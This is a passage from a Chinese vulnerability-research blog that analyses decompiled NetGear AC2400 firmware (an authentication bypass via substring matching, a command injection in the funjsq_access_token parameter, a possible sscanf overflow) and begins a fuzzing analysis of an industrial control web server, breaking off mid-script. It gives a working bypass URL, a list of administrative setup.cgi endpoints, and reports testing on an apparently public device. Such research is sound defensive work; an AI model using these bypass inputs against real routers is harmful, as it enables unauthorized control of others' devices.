<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( path_exist(path, off_427E50, v14)</span><br><span class="line">  || (v87 = path, <span class="built_in">strstr</span>(path, <span class="string">&quot;htpwd_recovery.cgi&quot;</span>)) &amp;&amp; (v88 = select_request_type(<span class="number">3</span>), !strcasecmp(v14, v88))</span><br><span class="line">  || <span class="built_in">strstr</span>(v87, <span class="string">&quot;PNPX_GetShareFolderList&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  multi_login_flag = <span class="number">0</span>;</span><br><span class="line">  login_or_not = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">    currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v89 = off_427E50;</span><br><span class="line">v90 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( *v89 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, *v89) )</span><br><span class="line">    v90 = <span class="number">1</span>;</span><br><span class="line">  ++v89;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第 8 行会将 currentsetting_flag 设为 1，从这里向前分析限制条件，要求我们发送的请求</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 访问的 URL 位于 off_427E50 指向的列表中</span><br><span class="line">2. 如果目标资源不在列表中，则需要 URL 中包含 htpwd_recovery.cgi 并且请求类型是 POST</span><br><span class="line">3. 如果上面两个条件都不满足，则需要 URL 中包含 PNPX_GetShareFolderList </span><br></pre></td></tr></table></figure></div>

<p>如果满足上面所述的条件，就会进入到 if 中，分别设置两个全局变量：multi_login_flag、login_or_not，并且如果 URL 中还包含 currentsetting.htm，就把 currentsetting_flag 设置成 1。</p>
<p>此外，maybe_login 函数只在 handle_request 函数中调用了一次，handle_request 函数中还调用了另一个比较关键的函数 execute_cgi。</p>
<p>httpd 只充当处理请求的角色，在确定了访问哪些接口之后，它会调用相应的 cgi 程序，execute_cgi 函数就负责解析和调用这些 cgi 程序。</p>
<p>在这个函数中还存在一些登录逻辑，相关代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">strlcpy(v101, dword_429734, <span class="number">10000</span>);</span><br><span class="line">  v0 = <span class="built_in">strrchr</span>(v101, <span class="number">47</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    *v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strlcpy(v101, <span class="string">&quot;.&quot;</span>, <span class="number">10000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">  &#123;</span><br><span class="line">    usb_auth_check(v101);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( login_or_not )</span><br><span class="line">  &#123;</span><br><span class="line">    maybe_login(v101);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>判断了 login_or_not 变量，如果不等于 0 就执行 login，同上，当构造满足特定要求的请求时，login_or_not 会被设置成 0，也能绕过这个逻辑。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !login_or_not</span><br><span class="line">  || currentsetting_flag</span><br><span class="line">  || *v2 != <span class="number">48</span></span><br><span class="line">  || *v3 == <span class="number">98</span></span><br><span class="line">  || !authorization</span><br><span class="line">  || !*authorization</span><br><span class="line">  || !<span class="built_in">strncmp</span>(path, <span class="string">&quot;/cgi-bin/genie.cgi&quot;</span>, <span class="number">0x12</span>u) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/dbg_sessionid&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  v9 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="built_in">fprintf</span>(v9, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;do_file&quot;</span>, <span class="number">2539</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    v9,</span><br><span class="line">    <span class="string">&quot;no need verify for no auth or soap or genie.cgi, %d, %d, %s, %s, %s\n&quot;</span>,</span><br><span class="line">    login_or_not,</span><br><span class="line">    currentsetting_flag,</span><br><span class="line">    v2,</span><br><span class="line">    v3,</span><br><span class="line">    authorization);</span><br><span class="line">  v10 = v9;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面这段代码判断多个变量的状态，和前一个判断 login_or_not 相同，有趣的是当满足条件进入 if，会打印 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">no need verify for no auth or soap or genie.cgi</span><br></pre></td></tr></table></figure></div>

<p>某些接口确实不需要权限验证就能访问，但是在实现这项功能时使用了 strstr 而不是精确匹配，导致出现绕过的问题。</p>
<p>用某公网设备测试，AC2400 存在一个可以开启 debug 模式的接口，链接</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setup.cgi?todo=debug</span><br></pre></td></tr></table></figure></div>

<p>默认情况下访问这个接口会得到 401</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/AC2400-1.png"
                     
                ></p>
<p>构造一个满足条件的 URL</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setup.cgi?todo=debug&amp;x=currentsetting.htm</span><br></pre></td></tr></table></figure></div>

<p>再次访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/AC2400-2.png"
                     
                ></p>
<p>可以看到成功访问了该接口，但可能是防火墙的原因，没法儿连接到 telnet。</p>
<p>还有一些可用的链接</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://gist.github.com/Donearm/978555</span><br><span class="line"># 请用本地设备测试</span><br><span class="line"></span><br><span class="line">DEBUGURL = &#x27;http://192.168.0.1/setup.cgi?todo=debug&#x27;</span><br><span class="line">REBOOTURL = &#x27;http://192.168.0.1/setup.cgi?next_file=diag.htm&amp;todo=reboot&#x27;</span><br><span class="line">#DISCONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=disconnect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm&#x27;</span><br><span class="line">DISCONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=disconnect&#x27;</span><br><span class="line">#CONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=connect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm&#x27;</span><br><span class="line">CONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=connect&#x27;</span><br><span class="line">STATTBLURL = &#x27;http://192.168.0.1/setup.cgi?next_file=stattbl.htm&#x27;</span><br><span class="line">LOGOUTURL = &#x27;http://192.168.0.1/setup.cgi?todo=logout&#x27;</span><br><span class="line">INTERVALURL = &#x27;http://192.168.0.1/setup.cgi?next_file=interval.htm&#x27;</span><br><span class="line">STATUSURL = &#x27;http://192.168.0.1/setup.cgi?next_file=s_status.htm&#x27; </span><br></pre></td></tr></table></figure></div>

<p><strong>注：对于不同型号的设备，能够绕过验证的功能不完全一致，某些可以用于 GET 请求，另一些可能只对 POST 请求有效。某些可能只对 htm 页面有效，其它只对 cgi 有效。</strong></p>
<p>新版的修复手段静态来看似乎是添加了单点登录，由于没有设备暂时无法验证新版固件的登录逻辑。</p>
<p>此外，NetGear 存在某些历史漏洞，也是登录验证绕过，触发方法是在 URL 中添加空字节或者添加 1.jpg 等字符串，参考链接：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/zer0yu/CVE_Request/tree/master/netgear</span><br><span class="line">https://www.zerodayinitiative.com/advisories/ZDI-19-866/</span><br></pre></td></tr></table></figure></div>

<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><p>官方发布信息：<a class="link"   href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers" >https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>披露信息：<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1423/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1423/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>漏洞评分：6.8(<strong>Medium</strong>)</p>
<p>漏洞描述：NetGear 部分路由器存在命令注入漏洞，拥有后台权限的攻击者可以利用此漏洞实现任意命令执行。</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>还是以 AC2400 为例，披露信息中提到命令注入发生的位置是 funjsq_access_token 参数，在解包目录中搜索包含这个字符串的文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -r &quot;funjsq_access_token&quot;</span><br></pre></td></tr></table></figure></div>

<p>可以找到名为 setup.cgi 的二进制程序，IDA 载入，找到字符串并交叉引用发现相关函数如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_407C80</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+18h] [-400h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">1023</span>]; <span class="comment">// [sp+19h] [-3FFh] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = find_val(a1, <span class="string">&quot;funjsq_access_token&quot;</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp;&amp; <span class="built_in">strlen</span>(v1) &gt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    COMMAND(<span class="string">&quot;/tmp/funjsq/bin/funjsq.sh login %s&quot;</span>, v1);</span><br><span class="line">    v2 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;1\&quot; &#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;0\&quot; &#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;v4, v2);</span><br><span class="line">  mime_header(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">  <span class="built_in">fputs</span>(&amp;v4, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>setup.cgi 主要负责实现后台的一些功能，某功能会用到参数 funjsq_access_token，在上面这个函数中解析出来之后直接带入函数 COMMAND (参数长度必须大于等于 6)。</p>
<p>经过查找，COMMAND 函数是 &#x2F;lib&#x2F;libscmisc.so 链接库导出的，相关代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">COMMAND</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+1Ch] [-404h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">1023</span>]; <span class="comment">// [sp+1Dh] [-403h] BYREF</span></span><br><span class="line">  va_list va; <span class="comment">// [sp+42Ch] [+Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a1);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  vsnprintf(&amp;v4, <span class="number">0x400</span>u, a1, va);</span><br><span class="line">  v2 = open(<span class="string">&quot;/etc/cmd_agent&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(v2, &amp;v4, <span class="number">0x400</span>u);</span><br><span class="line">    close(v2);</span><br><span class="line">    usleep(<span class="number">1u</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>把传入的参数写入 cmd_agent，它也是一个二进制程序，位于 &#x2F;usr&#x2F;sbin 目录下。IDA 简单分析发现它会执行写入其中的命令，那么显然这里存在命令注入的问题。</p>
<p>新版本代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_411840</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// $s0</span></span><br><span class="line">  FILE *v3; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [sp+20h] [-404h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">1023</span>]; <span class="comment">// [sp+21h] [-403h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = find_val(a1, <span class="string">&quot;funjsq_access_token&quot;</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  <span class="keyword">if</span> ( sub_4117D0(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v3, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;action.c&quot;</span>, <span class="string">&quot;funjsq_login&quot;</span>, <span class="number">11165</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;wrong method\n&quot;</span>, v3);</span><br><span class="line">      fclose(v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( region_isPR(<span class="number">4980736</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = nvram_get(<span class="string">&quot;wiz_language&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      v4 = nptr;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;Chinese&quot;</span>) &amp;&amp; test_command_inject(v2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v2, <span class="string">&quot;telneted&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v2) &gt;= <span class="number">6</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        COMMAND(<span class="string">&quot;/tmp/funjsq/bin/funjsq.sh login %s&quot;</span>, v2);</span><br><span class="line">        v5 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;1\&quot; &#125;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">        v5 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;0\&quot; &#125;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;v7, v5);</span><br><span class="line">      mime_header(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(&amp;v7, <span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>funjsq_access_token 参数主要是帆游加速器这个功能使用的，从新版代码来看，似乎是中国特供的功能，新版本中加入了对语言的判定，如果是中文才进行下一步操作。</p>
<p>另外引入了函数 test_command_inject 对参数过滤，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">test_command_inject</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $s2</span></span><br><span class="line">  FILE *v3; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">&quot;/bin&quot;</span>) || <span class="built_in">strstr</span>(a1, <span class="string">&quot;/sbin&quot;</span>) || (v2 = <span class="number">1</span>, <span class="built_in">strchr</span>(a1, <span class="string">&#x27;`&#x27;</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v3, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;other.c&quot;</span>, <span class="string">&quot;test_command_inject&quot;</span>, <span class="number">2495</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>(v3, <span class="string">&quot;Possible COMMAND injection detected:\&quot;%s\&quot;!\n&quot;</span>, a1);</span><br><span class="line">      fclose(v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>要求参数中不能存在 &#x2F;bin、&#x2F;sbin、字符 ‘&#96;’、字符串 telneted (从解压出来的固件中并没有发现 telnet<strong>e</strong>d 这个程序，似乎是开发人员多打了一个 e ？)。</p>
<p>静态来看这个漏洞并没有完全修复，虽然不能使用字符 ‘&#96;’，但是依然可以用其他手段绕过。</p>
<p>可以结合以上两个漏洞实现无需身份验证的任意命令执行，手头暂时没有合适的设备调试，感兴趣的同学可以自己尝试构造一下利用脚本。</p>
<h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><p>披露信息：暂无</p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先声明，我不确定这个漏洞能否触发，目前暂时没办法测试。</p>
<p>问题出现在新版本固件中(1.2.0.76)，用 IDA 进行分析，定位到函数 handle_request，从第 979 行开始代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(v109, <span class="string">&quot;?signature=&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v114 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v11, v114)</span><br><span class="line">    &amp;&amp; !v102</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">    &amp;&amp; !dword_42C9D8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v225 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v226, <span class="number">0</span>, <span class="keyword">sizeof</span>(v226));</span><br><span class="line">    <span class="built_in">memset</span>(v229, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">    sc_get_sn(&amp;v225, <span class="number">43</span>);</span><br><span class="line">    v226[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    v115 = <span class="built_in">strstr</span>(path, <span class="string">&quot;?signature=&quot;</span>);</span><br><span class="line">    <span class="built_in">sscanf</span>(v115 + <span class="number">11</span>, <span class="string">&quot;%s&quot;</span>, v229);            <span class="comment">// maybe vuln</span></span><br></pre></td></tr></table></figure></div>

<p>如果传入的请求满足以下条件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. URL 中包含 ?signature=</span><br><span class="line">2. 请求类型是 GET </span><br><span class="line">3. URL 中不包含 currentsetting.htm 以及上面写出的一些字符串</span><br></pre></td></tr></table></figure></div>

<p>程序会先用 strstr 定位 ?signature&#x3D; 的位置，然后跳过这个字符串，接着用 sscanf 函数将后续内容拷贝到变量 v229。</p>
<p>在拷贝的过程中没有判断源字符串长度，可能会导致溢出。不过 IDA 自动识别目的缓冲区大小为 2500 字节，能否传入这么长的 URL 暂时无法确定。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CNVD-2020-59818</title>
    <url>/2020/12/04/realinfo/</url>
    <content><![CDATA[<p>紫金桥组态软件是某工控系统的上位机控制软件，官方网站：<a class="link"   href="http://www.realinfo.com.cn/" >http://www.realinfo.com.cn/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>此漏洞发布于 2020-12-03，CNVD 链接：<a class="link"   href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-59818" >https://www.cnvd.org.cn/flaw/show/CNVD-2020-59818<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<span id="more"></span>

<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>漏洞评分：高</p>
<p>漏洞描述：紫金桥监控组态软件是一款专业的紫金桥监控组态软件，采用C&#x2F;S体系结构，拥有数据库处理技术和图形系统。紫金桥监控组态软件存在远程栈溢出漏洞。攻击者可利用漏洞导致web服务崩溃。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><strong>工控系统简介</strong></p>
<p>工控设备和一些常见的 IoT 设备有很多相似的地方，工控系统通常分为上位机和下位机，下位机负责直接控制设备或者获取设备状况，一般是一些 PLC 或者单片机，它们的计算能力较弱，只负责数据的采集和简单控制。</p>
<p>上位机可以直接发出操控命令，充当控制者的角色，通常由 PC 构成。</p>
<p>我们分析的漏洞就出现在上位机控制软件中，紫金桥组态软件官网宣称其用户包括中国石油、中国石化、中船重工等。</p>
<p>由于上位机充当整个系统的控制管理角色，其地位是比较重要的，一旦恶意用户掌握了上位机的操控权限，即可对整个生产流程进行修改，这将对工业生产造成极大的威胁。</p>
<p>软件下载地址(紫金桥监控组态软件 V6.5)：<a class="link"   href="http://www.realinfo.com.cn/html/software/Realinfo/index.html" >http://www.realinfo.com.cn/html/software/Realinfo/index.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<p>下载完成之后运行 Setup.cmd 安装。</p>
<p>漏洞描述中提到了触发漏洞将导致 web 服务崩溃，我们可以去官方帮助文档中查找关于 Web 服务的资料，在<a class="link"   href="http://www.realinfo.com.cn/html/technology/technical/index.html" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>搜索 Web，可以找到相关文章：<a class="link"   href="http://www.realinfo.com.cn/html/technology/technical/342.html%EF%BC%8C%E6%A0%B9%E6%8D%AE%E5%85%B6%E4%B8%AD%E7%9A%84%E6%8F%8F%E8%BF%B0%EF%BC%8C%E8%BD%AF%E4%BB%B6%E7%9A%84" >http://www.realinfo.com.cn/html/technology/technical/342.html，根据其中的描述，软件的<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> Web 功能主要用于数据展示，可以实时查看所需的信息。</p>
<p>帮助文档中提到 Web 发布程序是根目录下的 WebSvr.exe，双击运行可以看到如下界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-1.png"
                     
                ></p>
<p>Web 发布有两种方式，一是使用 IIS，二是用软件自带的 WEB 服务器，自带的 Web 服务默认运行在 80 端口，在浏览器中可以正常访问，默认的 Web 目录是程序安装路径下的 DemoApp\DemoFunction(1024_768)\，由于软件需要进行注册，暂时无法新建工程。正常使用过程中，Web 目录可以自行设置。</p>
<p>用浏览器访问的时候抓包，正常的访问请求如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /StartLog.Txt HTTP/1.1</span><br><span class="line">Host: 192.168.136.130</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div>

<p>服务器响应</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Server: MS-MFC-WebSvr/1.0</span><br><span class="line">Date: Fri, 04 Dec 2020 04:21:10 GMT</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Content-length: 62</span><br><span class="line">Last-Modified: Fri, 06 Apr 2007 00:09:06 GMT</span><br><span class="line"></span><br><span class="line">04 06 08:09 RestartProc C:\Program Files\RealInfo\WebSvr.EXE</span><br></pre></td></tr></table></figure></div>

<p>访问记录在服务端可以看到。</p>
<p>由于程序代码较多，并且是标准的 Web 服务，所以考虑先对其进行 fuzz，这里用到的工具是 boofuzz，关于 boofuzz 的使用方法网上可以找到很多教程，这里就不赘述了，编写 fuzz 脚本如下</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> boofuzz <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuck</span>():</span><br><span class="line">    session = Session(</span><br><span class="line">                sleep_time=<span class="number">0.2</span>,</span><br><span class="line">                target=Target(</span><br><span class="line">                connection=TCPSocketConnection(<span class="string">&quot;192.168.136.130&quot;</span>, <span class="number">80</span>)</span><br><span class="line">                ))</span><br><span class="line">    s_initialize(name=<span class="string">&quot;Request&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> s_block(<span class="string">&quot;Request-Line&quot;</span>):</span><br><span class="line">        <span 